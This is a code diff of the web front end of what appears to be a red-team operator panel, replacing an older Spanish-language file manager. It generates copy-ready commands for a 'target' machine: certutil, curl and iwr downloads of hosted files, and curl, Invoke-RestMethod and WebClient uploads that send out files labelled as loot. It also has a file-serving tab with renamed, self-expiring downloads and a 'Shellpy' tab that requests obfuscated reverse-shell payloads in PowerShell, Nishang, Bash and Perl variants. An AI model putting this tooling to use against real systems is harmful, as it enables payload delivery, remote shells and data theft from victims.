@@ -1,513 +1,708 @@
-  
+<!-- styles in /static/style.css -->
 
+<div id="file-list">
+  <h3>Tools</h3>
+  <input type="text" id="file-search" placeholder="Search..." oninput="filterFiles()" />
+  <div id="files"></div>
 
-<style>
-  #file-list {
-    width: 20%;
-    min-width: 200px;
-    max-width: 300px;
-    height: 80vh;
-    padding: 20px;
-    border-right: 1px solid #444;
-    box-sizing: border-box;
-    overflow-y: auto;
-    background: #222;
-    color: #0f0;
-  }
+  <h3 style="margin-top:16px;border-top:1px solid var(--border-primary);padding-top:12px;">Shellpy Output</h3>
+  <div id="shellpy-files"></div>
+</div>
 
-  body.light-mode #file-list {
-    background: #ddd;
-    color: #111;
-    border-right: 1px solid #bbb;
-  }
-
-  #editor {
-    flex: 1;
-    padding: 20px;
-    padding-top: 0;
-    box-sizing: border-box;
-    overflow-y: auto;
-  }
-
-  #file-list h3, #editor h3 {
-    margin-top: 0;
-    font-family: monospace;
-  }
-
-  .file-item {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 10px;
-  }
-
-  .file-item button {
-    background: #333;
-    border: none;
-    color: #0f0;
-    padding: 5px 10px;
-    cursor: pointer;
-    font-family: monospace;
-    font-size: 14px;
-  }
-
-  body.light-mode .file-item button {
-    background: #ccc;
-    color: #111;
-  }
-
-  .tabs {
-    display: flex;
-    margin-bottom: 20px;
-  }
-
-  .tab {
-    padding: 10px 20px;
-    cursor: pointer;
-    background-color: #333;
-    color: #0f0;
-    margin-right: 5px;
-    font-family: monospace;
-    font-size: 14px;
-    border: none;
-  }
-
-  body.light-mode .tab {
-    background-color: #ccc;
-    color: #111;
-  }
-
-  .tab.active {
-    background-color: #0f0;
-    color: #111;
-  }
-
-  textarea {
-    width: 100%;
-    height: 50vh;
-    background: #111;
-    color: #0f0;
-    border: 1px solid #444;
-    padding: 10px;
-    font-family: monospace;
-  }
-
-  body.light-mode textarea {
-    background: #fff;
-    color: #111;
-    border: 1px solid #bbb;
-  }
-
-  .clipboard {
-    display: flex;
-    justify-content: space-between;
-    margin-top: 20px;
-    gap: 10px;
-  }
-
-  .clipboard textarea {
-    width: 32%;
-    height: 100px;
-  }
-
-  .upload-area, .download-area {
-    display: none;
-  }
-
-  .upload-area.active, .download-area.active {
-    display: block;
-  }
-</style>
-
-
-<div id="content">
-  <div id="file-list">
-    <h3>Archivos</h3>
-    <input type="text" id="file-search" placeholder="Buscar archivos..." oninput="filterFiles()" />
-    <div id="files"></div>
+<div id="editor">
+  <div class="tabs">
+    <div class="tab active" id="editor-tab">Editor</div>
+    <div class="tab" id="send-tab">Send to Target</div>
+    <div class="tab" id="grab-tab">Grab from Target</div>
+    <div class="tab" id="serve-tab">Serve</div>
+    <div class="tab" id="shellpy-tab">Shellpy</div>
   </div>
 
-  <div id="editor">
-    <h3>
-      <div class="tabs">
-        <div class="tab active" id="editor-tab">Editor</div>
-        <div class="tab" id="upload-tab">Upload</div>
-        <div class="tab" id="download-tab">Download</div>
-      </div>
-    </h3>
+  <!-- EDITOR -->
+  <div id="editor-content" class="tab-content active">
+    <div class="cmd-form-row" style="margin-bottom:8px;">
+      <label>File:</label>
+      <select id="editor-file-select"></select>
+    </div>
+    <textarea id="file-content" placeholder="Select a file above to edit"></textarea>
+    <div class="tools-editor-bar">
+      <button id="save-button" class="btn btn-primary" disabled>Save</button>
+    </div>
+    <div class="clipboard">
+      <textarea id="clipboard-1" placeholder="Clipboard 1"></textarea>
+      <textarea id="clipboard-2" placeholder="Clipboard 2"></textarea>
+      <textarea id="clipboard-3" placeholder="Clipboard 3"></textarea>
+    </div>
+  </div>
 
-    <div id="editor-content" class="active">
-      <textarea id="file-content" placeholder="Selecciona un archivo para ver o editar su contenido"></textarea>
-      <button id="save-button" disabled>Save</button>
-
-      <div class="clipboard">
-        <textarea id="clipboard-1" placeholder="Clipboard 1"></textarea>
-        <textarea id="clipboard-2" placeholder="Clipboard 2"></textarea>
-        <textarea id="clipboard-3" placeholder="Clipboard 3"></textarea>
+  <!-- SEND TO TARGET (commands to push a file to victim) -->
+  <div id="send-area" class="tab-content">
+    <h3>Generate download commands for the target machine</h3>
+    <div class="cmd-form">
+      <div class="cmd-form-row">
+        <label>File:</label>
+        <select id="send-file-select"></select>
+        <label>IP:</label>
+        <input type="text" id="send-ip" list="send-ip-list" placeholder="10.10.10.10" autocomplete="off" />
+        <datalist id="send-ip-list"></datalist>
+        <label>Port:</label>
+        <input type="number" id="send-port" value="5000" style="width:80px;" />
+        <button class="btn btn-primary" onclick="generateSendCmds()">Generate</button>
       </div>
     </div>
+    <div id="send-cmd-output" class="cmd-output"></div>
+  </div>
 
-    <div id="upload-area" class="upload-area">
-      <h3>Upload file to remote host</h3>
-      <div id="command-line">
-        <label for="file-field">File:</label>
-        <input type="text" id="download-file-field" placeholder="Nombre del archivo" list="file-suggestions" />
-        <datalist id="file-suggestions"></datalist>
-
-        <label for="upload-port-field">Port:</label>
-        <input type="number" id="download-port-field" placeholder="80" value="80" />
-
-        <label for="ip-select">IP:</label>
-        <select class="ip-select" id="download-ip-select"></select>
-
-        <button id="download-generate-command">Generar Comando</button>
-        <p id="download-command-output"></p>
+  <!-- GRAB FROM TARGET (commands for victim to upload to us + browser upload) -->
+  <div id="grab-area" class="tab-content">
+    <h3>Browser Upload</h3>
+    <p style="color:var(--text-secondary);margin:0 0 8px 0;font-size:12px;">If you have browser access on target, upload files directly here.</p>
+    <div class="cmd-form">
+      <div class="cmd-form-row">
+        <input type="file" id="grab-file-input" />
+        <button class="btn btn-primary" onclick="browserUpload()">Upload</button>
       </div>
     </div>
+    <div id="grab-upload-status" style="margin:6px 0;font-size:12px;"></div>
 
-    <div id="download-area" class="download-area">
-      <h3>Download file to this host</h3>
-      <input type="file" id="file-input" />
-      <button id="upload-button">Upload</button>
-      <p id="upload-status"></p>
-
-      <h3>Command Line</h3>
-      <div id="command-line">
-        <label for="upload-file-field">File:</label>
-        <input type="text" id="upload-file-field" placeholder="C:\temp\bloodhound.zip" value="C:\temp\bloodhound.zip" />
-        <label for="upload-port-field">Port:</label>
-        <input type="number" id="upload-port-field" placeholder="5000" value="5000" />
-        <label for="ip-select">IP:</label>
-        <select class="ip-select" id="upload-ip-select"></select>
-
-        <button id="upload-generate-command">Generar Comando</button>
-        <p id="upload-command-output"></p>
+    <h3 style="margin-top:16px;">Command Line Upload</h3>
+    <p style="color:var(--text-secondary);margin:0 0 8px 0;font-size:12px;">Generate commands to exfiltrate files from the target via CLI.</p>
+    <div class="cmd-form">
+      <div class="cmd-form-row">
+        <label>Remote file:</label>
+        <input type="text" id="grab-file" placeholder="C:\temp\loot.zip" />
+        <label>IP:</label>
+        <input type="text" id="grab-ip" list="grab-ip-list" placeholder="10.10.10.10" autocomplete="off" />
+        <datalist id="grab-ip-list"></datalist>
+        <label>Port:</label>
+        <input type="number" id="grab-port" value="5000" style="width:80px;" />
+        <button class="btn btn-primary" onclick="generateGrabCmds()">Generate</button>
       </div>
     </div>
+    <div id="grab-cmd-output" class="cmd-output"></div>
+  </div>
+
+  <!-- SERVE -->
+  <div id="serve-area" class="tab-content">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+      <h3 style="margin:0;">File Hosting</h3>
+      <button class="btn btn-primary" onclick="toggleServeForm()">+ Host File</button>
+    </div>
+    <div id="serve-form" style="display:none;margin-bottom:12px;" class="serve-card">
+      <div style="padding:14px;">
+        <div class="cmd-form-row" style="margin-bottom:8px;">
+          <label>Source file:</label>
+          <select id="serve-file-select"></select>
+          <label>Serve as:</label>
+          <input type="text" id="serve-as" placeholder="custom-name.exe" style="flex:1;" />
+        </div>
+        <div class="cmd-form-row" style="margin-bottom:8px;">
+          <label>IP:</label>
+          <select id="serve-ip"></select>
+          <label>Burn after:</label>
+          <input type="number" id="serve-max" value="0" min="0" style="width:60px;" title="0 = unlimited" />
+          <span style="color:var(--text-muted);font-size:11px;">downloads (0=unlimited)</span>
+        </div>
+        <div class="cmd-form-row" style="margin-bottom:8px;">
+          <label>Password:</label>
+          <input type="text" id="serve-password" placeholder="(none)" style="flex:1;" />
+          <span style="color:var(--text-muted);font-size:11px;">HTTP Basic Auth</span>
+        </div>
+        <div style="display:flex;gap:6px;justify-content:flex-end;">
+          <button class="btn btn-primary" onclick="createServe()">Deploy</button>
+          <button class="btn" onclick="toggleServeForm()">Cancel</button>
+        </div>
+      </div>
+    </div>
+    <div id="serve-sessions"></div>
+  </div>
+
+  <!-- SHELLPY -->
+  <div id="shellpy-area" class="tab-content">
+    <h3>Generate Obfuscated Payloads</h3>
+    <p style="color:var(--text-secondary);font-size:12px;margin:0 0 10px 0;">Generate all shellpy variants (raw + obfuscated + base64 + macro). Files saved to shellpy_output/ and listed in the sidebar.</p>
+    <div class="cmd-form">
+      <div class="cmd-form-row">
+        <label>IP:</label>
+        <input type="text" id="sp-ip" list="sp-ip-list" placeholder="10.10.10.10" autocomplete="off" />
+        <datalist id="sp-ip-list"></datalist>
+        <label>Port:</label>
+        <input type="number" id="sp-port" value="4444" style="width:80px;" />
+        <label>Type:</label>
+        <select id="sp-type">
+          <option value="all">All</option>
+          <option value="powershell">PowerShell</option>
+          <option value="powercat">PowerCat</option>
+          <option value="nishang">Nishang</option>
+          <option value="conpty">ConPty</option>
+          <option value="bash">Bash</option>
+          <option value="perl">Perl</option>
+        </select>
+        <button class="btn btn-primary" onclick="generateShellpyFiles()">Generate</button>
+        <button class="btn" onclick="clearShellpyFiles()">Clear All</button>
+      </div>
+    </div>
+    <div id="sp-status" style="margin:8px 0;font-size:12px;"></div>
+    <div id="sp-file-viewer"></div>
   </div>
 </div>
 
 
 <script>
+var allFiles = [];
+var allIps = [];
+
 function initTools() {
-  console.log("[*] Inicializando Tools...");
-
-  initDarkMode();
-  initTabs();
-  initFileManager();
-  initUploadDownload();
-}
-
-// -------------- DARK MODE ---------------
-function initDarkMode() {
-  const toggleBtn = document.getElementById('toggle-mode');
-  if (!toggleBtn) return;
-
-  toggleBtn.onclick = () => {
-    document.body.classList.toggle('dark-mode');
-    const isDark = document.body.classList.contains('dark-mode');
-    toggleBtn.textContent = isDark ? 'Clear' : 'Dark';
-  };
-}
-
-// -------------- TABS ---------------
-function initTabs() {
-  const editorTab = document.getElementById('editor-tab');
-  const uploadTab = document.getElementById('upload-tab');
-  const downloadTab = document.getElementById('download-tab');
-
-  editorTab.onclick = () => {
-    document.getElementById('editor-content').style.display = 'block';
-    document.getElementById('upload-area').style.display = 'none';
-    document.getElementById('download-area').style.display = 'none';
-    editorTab.classList.add('active');
-    uploadTab.classList.remove('active');
-    downloadTab.classList.remove('active');
-  };
-
-  uploadTab.onclick = () => {
-    document.getElementById('editor-content').style.display = 'none';
-    document.getElementById('upload-area').style.display = 'block';
-    document.getElementById('download-area').style.display = 'none';
-    editorTab.classList.remove('active');
-    uploadTab.classList.add('active');
-    downloadTab.classList.remove('active');
-  };
-
-  downloadTab.onclick = () => {
-    document.getElementById('editor-content').style.display = 'none';
-    document.getElementById('upload-area').style.display = 'none';
-    document.getElementById('download-area').style.display = 'block';
-    editorTab.classList.remove('active');
-    uploadTab.classList.remove('active');
-    downloadTab.classList.add('active');
-  };
-}
-
-// -------------- FILE MANAGER ---------------
-function initFileManager() {
-  fetchFiles();
+  initToolsTabs();
+  fetchToolsData();
   fetchClipboards();
 }
 
-// Copiar texto
-function copyToClipboard(id) {
-  let text = document.getElementById(id).innerText;
-  navigator.clipboard.writeText(text);
-}
-
-// Cargar archivos del servidor
-let allFiles = [];
-
-async function fetchFiles() {
-  const response = await fetch('/files');
-  allFiles = await response.json();
-  displayFiles(allFiles);
-  updateFileSuggestions(allFiles);
-}
-
-function displayFiles(files) {
-  const filesDiv = document.getElementById('files');
-  filesDiv.innerHTML = '';
-
-  files.forEach(file => {
-    const fileItem = document.createElement('div');
-    fileItem.className = 'file-item';
-
-    const fileName = document.createElement('span');
-    fileName.textContent = file;
-
-    const buttonContainer = document.createElement('div');
-    buttonContainer.style.display = 'flex';
-
-    const viewButton = document.createElement('button');
-    viewButton.textContent = 'Edit';
-    viewButton.onclick = () => loadFile(file);
-
-    const downloadButton = document.createElement('button');
-    downloadButton.textContent = 'Descargar';
-    downloadButton.onclick = () => downloadFile(file);
-
-    buttonContainer.appendChild(viewButton);
-    buttonContainer.appendChild(downloadButton);
-    fileItem.appendChild(fileName);
-    fileItem.appendChild(buttonContainer);
-    filesDiv.appendChild(fileItem);
+function initToolsTabs() {
+  var tabs = {
+    'editor-tab': 'editor-content',
+    'send-tab': 'send-area',
+    'grab-tab': 'grab-area',
+    'serve-tab': 'serve-area',
+    'shellpy-tab': 'shellpy-area'
+  };
+  Object.keys(tabs).forEach(function(tabId) {
+    document.getElementById(tabId).onclick = function() {
+      // Hide all
+      document.querySelectorAll('.tab-content').forEach(function(el) { el.style.display = 'none'; });
+      document.querySelectorAll('.tabs .tab').forEach(function(el) { el.classList.remove('active'); });
+      // Show selected
+      document.getElementById(tabs[tabId]).style.display = 'block';
+      this.classList.add('active');
+      // Refresh serve sessions when serve tab opened
+      if (tabId === 'serve-tab') refreshServes();
+    };
   });
 }
 
-function updateFileSuggestions(files) {
-  const fileSuggestions = document.getElementById('file-suggestions');
-  fileSuggestions.innerHTML = '';
-  files.forEach(file => {
-    const option = document.createElement('option');
-    option.value = file;
-    fileSuggestions.appendChild(option);
+async function fetchToolsData() {
+  // Files
+  var res = await fetch('/files');
+  allFiles = (await res.json()).filter(function(f) { return !f.endsWith('.md'); });
+  displayFiles(allFiles);
+  populateFileDropdowns();
+
+  // IPs
+  var ipRes = await fetch('/ips');
+  allIps = await ipRes.json();
+  populateIPFields();
+
+  // Shellpy files
+  refreshShellpyFileList();
+}
+
+function displayFiles(files) {
+  var container = document.getElementById('files');
+  while (container.firstChild) container.removeChild(container.firstChild);
+  files.forEach(function(file) {
+    var item = document.createElement('div');
+    item.className = 'file-item-simple';
+    item.textContent = file;
+    container.appendChild(item);
   });
 }
 
 function filterFiles() {
-  const searchTerm = document.getElementById('file-search').value.toLowerCase();
-  const filteredFiles = allFiles.filter(file => file.toLowerCase().includes(searchTerm));
-  displayFiles(filteredFiles);
+  var term = document.getElementById('file-search').value.toLowerCase();
+  displayFiles(allFiles.filter(function(f) { return f.toLowerCase().includes(term); }));
+}
+
+function populateFileDropdowns() {
+  ['editor-file-select', 'send-file-select', 'serve-file-select'].forEach(function(id) {
+    var sel = document.getElementById(id);
+    if (!sel) return;
+    while (sel.firstChild) sel.removeChild(sel.firstChild);
+    var empty = document.createElement('option');
+    empty.value = '';
+    empty.textContent = '-- select --';
+    sel.appendChild(empty);
+    allFiles.forEach(function(f) {
+      var opt = document.createElement('option');
+      opt.value = f;
+      opt.textContent = f;
+      sel.appendChild(opt);
+    });
+  });
+
+  // Editor dropdown change handler
+  document.getElementById('editor-file-select').onchange = function() {
+    if (this.value) loadFile(this.value);
+  };
+}
+
+function populateIPFields() {
+  ['send-ip-list', 'grab-ip-list', 'sp-ip-list'].forEach(function(id) {
+    var list = document.getElementById(id);
+    if (!list) return;
+    allIps.forEach(function(ip) {
+      var opt = document.createElement('option');
+      opt.value = ip;
+      list.appendChild(opt);
+    });
+  });
+  // Serve IP dropdown
+  var serveIp = document.getElementById('serve-ip');
+  if (serveIp) {
+    while (serveIp.firstChild) serveIp.removeChild(serveIp.firstChild);
+    allIps.forEach(function(ip) {
+      var opt = document.createElement('option');
+      opt.value = ip;
+      opt.textContent = ip;
+      serveIp.appendChild(opt);
+    });
+  }
+  // Set defaults
+  if (allIps.length > 0) {
+    var sendIp = document.getElementById('send-ip');
+    var grabIp = document.getElementById('grab-ip');
+    if (sendIp && !sendIp.value) sendIp.value = allIps[0];
+    if (grabIp && !grabIp.value) grabIp.value = allIps[0];
+    var spIp = document.getElementById('sp-ip');
+    if (spIp && !spIp.value) spIp.value = allIps[0];
+  }
 }
 
 async function loadFile(filename) {
-  const response = await fetch(`/files/${filename}`);
-  const data = await response.json();
-  if (data.content) {
+  var response = await fetch('/files/' + filename);
+  var data = await response.json();
+  if (data.content !== undefined) {
     document.getElementById('file-content').value = data.content;
     document.getElementById('save-button').disabled = false;
-    document.getElementById('save-button').onclick = () => saveFile(filename);
-  } else {
-    alert('Error al cargar el archivo');
+    document.getElementById('save-button').onclick = function() { saveFile(filename); };
   }
 }
 
 async function saveFile(filename) {
-  const content = document.getElementById('file-content').value;
-  await fetch(`/files/${filename}`, {
+  await fetch('/files/' + filename, {
     method: 'PUT',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ content })
+    body: JSON.stringify({ content: document.getElementById('file-content').value })
   });
-  alert('Archivo guardado');
 }
 
-function downloadFile(filename) {
-  window.location.href = `/download/${filename}`;
-}
-
-// -------------- CLIPBOARDS ---------------
+// ===== CLIPBOARDS =====
 async function fetchClipboards() {
-  const response = await fetch('/clipboards');
-  const clipboards = await response.json();
-  document.getElementById('clipboard-1').value = clipboards[0];
-  document.getElementById('clipboard-2').value = clipboards[1];
-  document.getElementById('clipboard-3').value = clipboards[2];
-
-  document.getElementById('clipboard-1').oninput = () => updateClipboard(0);
-  document.getElementById('clipboard-2').oninput = () => updateClipboard(1);
-  document.getElementById('clipboard-3').oninput = () => updateClipboard(2);
+  var response = await fetch('/clipboards');
+  var clips = await response.json();
+  for (var i = 0; i < 3; i++) {
+    document.getElementById('clipboard-' + (i+1)).value = clips[i];
+    (function(idx) {
+      document.getElementById('clipboard-' + (idx+1)).oninput = function() { updateClipboard(idx); };
+    })(i);
+  }
 }
 
 async function updateClipboard(index) {
-  const content = document.getElementById(`clipboard-${index + 1}`).value;
-  await fetch(`/clipboards/${index}`, {
+  await fetch('/clipboards/' + index, {
     method: 'PUT',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ content })
+    body: JSON.stringify({ content: document.getElementById('clipboard-' + (index + 1)).value })
   });
 }
 
-// -------------- UPLOAD & DOWNLOAD ---------------
-function initUploadDownload() {
-  initIPSelection();
-  initUploadDownloadCommands();
+// ===== COMMAND HELPERS =====
+function buildCmdBlock(container, label, cmds) {
+  var title = document.createElement('div');
+  title.className = 'cmd-section-title';
+  title.textContent = label;
+  container.appendChild(title);
+
+  cmds.forEach(function(cmd) {
+    var row = document.createElement('div');
+    row.className = 'cmd-row';
+    var code = document.createElement('code');
+    code.textContent = cmd;
+    var btn = document.createElement('button');
+    btn.className = 'btn btn-sm';
+    btn.textContent = 'Copy';
+    btn.setAttribute('data-cmd', cmd);
+    btn.onclick = function() {
+      navigator.clipboard.writeText(this.getAttribute('data-cmd'));
+      this.textContent = 'Copied!';
+      var self = this;
+      setTimeout(function() { self.textContent = 'Copy'; }, 1200);
+    };
+    row.appendChild(code);
+    row.appendChild(btn);
+    container.appendChild(row);
+  });
 }
 
-async function initIPSelection() {
+// ===== SEND TO TARGET =====
+function generateSendCmds() {
+  var file = document.getElementById('send-file-select').value;
+  var ip = document.getElementById('send-ip').value;
+  var port = document.getElementById('send-port').value;
+  if (!file || !ip || !port) return;
+
+  var container = document.getElementById('send-cmd-output');
+  while (container.firstChild) container.removeChild(container.firstChild);
+
+  buildCmdBlock(container, 'Windows (run on target)', [
+    "curl http://" + ip + ":" + port + "/download/" + file + " -o " + file,
+    "certutil.exe -f -urlcache -split http://" + ip + ":" + port + "/download/" + file,
+    "iwr -uri http://" + ip + ":" + port + "/download/" + file + " -OutFile " + file,
+    "iwr -UseBasicParsing http://" + ip + ":" + port + "/download/" + file + " -OutFile " + file
+  ]);
+  buildCmdBlock(container, 'Linux (run on target)', [
+    "wget http://" + ip + ":" + port + "/download/" + file,
+    "curl -O http://" + ip + ":" + port + "/download/" + file
+  ]);
+}
+
+// ===== GRAB FROM TARGET =====
+async function browserUpload() {
+  var fileInput = document.getElementById('grab-file-input');
+  var status = document.getElementById('grab-upload-status');
+  if (!fileInput.files.length) { status.textContent = 'Select a file first'; return; }
+
+  var file = fileInput.files[0];
+  status.textContent = 'Uploading ' + file.name + '...';
+  status.style.color = 'var(--text-accent)';
+
   try {
-    const response = await fetch('/ips');
-    const ips = await response.json();
-    const selects = document.getElementsByClassName('ip-select');
-    Array.from(selects).forEach(select => {
-      ips.forEach(ip => {
-        const option = document.createElement('option');
-        option.value = ip;
-        option.textContent = ip;
-        select.appendChild(option);
-      });
+    var res = await fetch('/upload/' + encodeURIComponent(file.name), {
+      method: 'PUT',
+      body: file
     });
-  } catch (error) {
-    console.error('Error obteniendo IPs:', error);
+    if (res.ok) {
+      status.textContent = 'Uploaded: ' + file.name + ' (' + file.size + ' bytes)';
+      status.style.color = 'var(--green)';
+    } else {
+      status.textContent = 'Upload failed: ' + res.statusText;
+      status.style.color = 'var(--red)';
+    }
+  } catch(e) {
+    status.textContent = 'Upload error: ' + e.message;
+    status.style.color = 'var(--red)';
   }
 }
 
-function initUploadDownloadCommands() {
-  const uploadGenerateBtn = document.getElementById('upload-generate-command');
-  const downloadGenerateBtn = document.getElementById('download-generate-command');
+function generateGrabCmds() {
+  var file = document.getElementById('grab-file').value;
+  var ip = document.getElementById('grab-ip').value;
+  var port = document.getElementById('grab-port').value;
+  if (!file || !ip || !port) return;
+  var fname = file.split('\\').pop().split('/').pop();
 
-  uploadGenerateBtn.onclick = generateUploadCommands;
-  downloadGenerateBtn.onclick = generateDownloadCommands;
+  var container = document.getElementById('grab-cmd-output');
+  while (container.firstChild) container.removeChild(container.firstChild);
+
+  buildCmdBlock(container, 'Windows (run on target)', [
+    '& curl.exe --upload-file "' + file + '" http://' + ip + ':' + port + '/upload/' + fname,
+    "Invoke-RestMethod -Uri http://" + ip + ":" + port + "/upload/" + fname + " -Method PUT -InFile \"" + file + "\"",
+    "(New-Object System.Net.WebClient).UploadFile('http://" + ip + ":" + port + "/upload/" + fname + "', '" + file + "')",
+    "iwr -uri http://" + ip + ":" + port + "/upload/" + fname + " -Method Put -InFile '" + file + "' -UseBasicParsing"
+  ]);
+  buildCmdBlock(container, 'Linux (run on target)', [
+    "curl -X POST -F 'file=@" + file + "' http://" + ip + ":" + port + "/upload/" + fname,
+    "wget --method=PUT --body-file=" + file + " http://" + ip + ":" + port + "/upload/" + fname
+  ]);
 }
 
+// ===== SERVE =====
+function toggleServeForm() {
+  var form = document.getElementById('serve-form');
+  form.style.display = form.style.display === 'none' ? 'block' : 'none';
+}
 
-function generateUploadCommands() {
-  const file = document.getElementById('upload-file-field').value;
-  const port = document.getElementById('upload-port-field').value;
-  const ip = document.getElementById('upload-ip-select').value;
+async function createServe() {
+  var file = document.getElementById('serve-file-select').value;
+  if (!file) return;
+  var servedAs = document.getElementById('serve-as').value.trim() || file;
+  var max = parseInt(document.getElementById('serve-max').value) || 0;
+  var password = document.getElementById('serve-password').value.trim();
 
-  if (!file || !port || !ip) {
-    alert('Completa todos los campos');
+  await fetch('/api/serve', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ filename: file, folder: 'tools', max_downloads: max, served_as: servedAs, password: password })
+  });
+  document.getElementById('serve-form').style.display = 'none';
+  // Reset form
+  document.getElementById('serve-as').value = '';
+  document.getElementById('serve-max').value = '0';
+  document.getElementById('serve-password').value = '';
+  refreshServes();
+}
+
+async function refreshServes() {
+  var res = await fetch('/api/serve');
+  var sessions = await res.json();
+  var container = document.getElementById('serve-sessions');
+  while (container.firstChild) container.removeChild(container.firstChild);
+
+  if (sessions.length === 0) {
+    var empty = document.createElement('div');
+    empty.style.cssText = 'color:var(--text-muted);padding:12px 0;';
+    empty.textContent = 'No active serve sessions. Click + Host File to start.';
+    container.appendChild(empty);
     return;
   }
 
-  const uploadWindows = [
-    `& curl.exe --upload-file "${file}" http://${ip}:${port}/upload/${file.split('\\').pop()}`,
-    `Invoke-RestMethod -Uri http://${ip}:${port}/upload/${file.split('\\').pop()} -Method PUT -InFile "${file}"`,
-    `(New-Object System.Net.WebClient).UploadFile('http://${ip}:${port}/upload/${file.split('\\').pop()}', '${file}')`,
-    `curl.exe -F 'file=@${file}' http://${ip}:${port}/upload/${file.split('\\').pop()}`,
-    `iwr -uri http://${ip}:${port}/upload/${file.split('\\').pop()} -Method Put -InFile '${file}' -UseBasicParsing`
-  ];
+  var serveIp = document.getElementById('serve-ip');
+  var myIp = serveIp ? serveIp.value : (allIps.length > 0 ? allIps[0] : '0.0.0.0');
 
-  const uploadLinux = [
-    `curl -X POST -F 'file=@${file}' http://${ip}:${port}/upload/${file.split('/').pop()}`,
-    `wget --method=PUT --body-file=${file} --header="Content-Length: $(wc -c < ${file})" --header="Content-Type: application/octet-stream" http://${ip}:${port}/upload/${file.split('/').pop()}`
-  ];
+  sessions.forEach(function(s) {
+    var card = document.createElement('div');
+    card.className = 'serve-card';
 
-  let outputHTML = `<strong>Upload Commands (Windows):</strong><br>` +
-    uploadWindows.map((cmd, idx) => `
-      <div>
-        <button onclick="copyToClipboard('command-upload-${idx}')">Copiar</button>
-        <code id="command-upload-${idx}">${cmd}</code>
-      </div>`).join('') +
-    `<br><strong>Upload Commands (Linux):</strong><br>` +
-    uploadLinux.map((cmd, idx) => `
-      <div>
-        <button onclick="copyToClipboard('command-upload-${idx + uploadWindows.length}')">Copiar</button>
-        <code id="command-upload-${idx + uploadWindows.length}">${cmd}</code>
-      </div>`).join('');
+    // Header row
+    var header = document.createElement('div');
+    header.className = 'serve-header';
 
-  document.getElementById('upload-command-output').innerHTML = outputHTML;
+    var info = document.createElement('div');
+    info.style.cssText = 'display:flex;align-items:center;gap:8px;flex-wrap:wrap;';
+
+    var dot = document.createElement('span');
+    dot.className = 'status-dot ' + (s.active ? 'green' : 'red');
+    info.appendChild(dot);
+
+    var fname = document.createElement('strong');
+    fname.textContent = s.served_as || s.filename;
+    info.appendChild(fname);
+
+    if (s.served_as && s.served_as !== s.filename) {
+      var orig = document.createElement('span');
+      orig.style.cssText = 'color:var(--text-muted);font-size:11px;';
+      orig.textContent = '(' + s.filename + ')';
+      info.appendChild(orig);
+    }
+
+    // Badges
+    if (s.max_downloads > 0) {
+      var burnBadge = document.createElement('span');
+      burnBadge.className = 'serve-badge burn';
+      var remaining = s.max_downloads - s.downloads;
+      burnBadge.textContent = 'BURN ' + remaining + '/' + s.max_downloads;
+      info.appendChild(burnBadge);
+    }
+
+    if (s.password) {
+      var authBadge = document.createElement('span');
+      authBadge.className = 'serve-badge auth';
+      authBadge.textContent = 'AUTH';
+      info.appendChild(authBadge);
+    }
+
+    var dlCount = document.createElement('span');
+    dlCount.style.cssText = 'color:var(--text-muted);font-size:11px;';
+    dlCount.textContent = s.downloads + ' downloads';
+    info.appendChild(dlCount);
+
+    var actions = document.createElement('div');
+    actions.style.cssText = 'display:flex;gap:4px;';
+
+    var stopBtn = document.createElement('button');
+    stopBtn.className = 'btn btn-sm';
+    stopBtn.textContent = s.active ? 'Stop' : 'Stopped';
+    stopBtn.disabled = !s.active;
+    stopBtn.setAttribute('data-sid', s.id);
+    stopBtn.onclick = function() {
+      fetch('/api/serve/' + this.getAttribute('data-sid'), { method: 'DELETE' })
+        .then(function() { refreshServes(); });
+    };
+    actions.appendChild(stopBtn);
+
+    header.appendChild(info);
+    header.appendChild(actions);
+    card.appendChild(header);
+
+    // Commands
+    if (s.active) {
+      var cmds = document.createElement('div');
+      cmds.className = 'serve-cmds';
+      var url = 'http://' + myIp + ':5000' + s.url;
+      var authFlag = s.password ? ' -u :' + s.password : '';
+
+      buildCmdBlock(cmds, 'Download (run on target)', [
+        'curl' + authFlag + ' ' + url + ' -o ' + (s.served_as || s.filename),
+        'wget' + (s.password ? ' --password=' + s.password : '') + ' ' + url,
+        'certutil.exe -f -urlcache -split ' + url,
+        'iwr -uri ' + url + ' -OutFile ' + (s.served_as || s.filename)
+      ]);
+      card.appendChild(cmds);
+    }
+
+    // Log
+    if (s.log.length > 0) {
+      var logDiv = document.createElement('div');
+      logDiv.className = 'serve-log';
+      var logTitle = document.createElement('div');
+      logTitle.className = 'cmd-section-title';
+      logTitle.textContent = 'Download log (' + s.log.length + ')';
+      logDiv.appendChild(logTitle);
+
+      s.log.forEach(function(entry) {
+        var line = document.createElement('div');
+        line.className = 'serve-log-entry';
+        var d = new Date(entry.time);
+        line.textContent = '#' + entry.count + '  ' + entry.ip + '  ' + d.toLocaleTimeString();
+        if (entry.ua) {
+          var ua = document.createElement('span');
+          ua.style.cssText = 'color:var(--text-muted);margin-left:8px;font-size:10px;';
+          ua.textContent = entry.ua.substring(0, 50);
+          line.appendChild(ua);
+        }
+        logDiv.appendChild(line);
+      });
+      card.appendChild(logDiv);
+    }
+
+    container.appendChild(card);
+  });
 }
 
+// ===== SHELLPY =====
+async function generateShellpyFiles() {
+  var ip = document.getElementById('sp-ip').value.trim();
+  var port = document.getElementById('sp-port').value;
+  var type = document.getElementById('sp-type').value;
+  var status = document.getElementById('sp-status');
+  if (!ip || !port) { status.textContent = 'Enter IP and port'; return; }
 
+  status.textContent = 'Generating...';
+  status.style.color = 'var(--text-accent)';
 
-
-
-/*
-function generateUploadCommands() {
-  const file = document.getElementById('upload-file-field').value;
-  const port = document.getElementById('upload-port-field').value;
-  const ip = document.getElementById('upload-ip-select').value;
-
-  if (!file || !port || !ip) {
-    alert('Completa todos los campos');
+  var res = await fetch('/api/shellpy/generate', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ ip: ip, port: port, shell_type: type })
+  });
+  var data = await res.json();
+  if (data.error) {
+    status.textContent = 'Error: ' + data.error;
+    status.style.color = 'var(--red)';
     return;
   }
 
-  const uploadWindows = [
-    `(New-Object System.Net.WebClient).UploadFile('http://${ip}:${port}/', '${file}')`,
-    `curl.exe -F 'file=@${file}' http://${ip}:${port}/`,
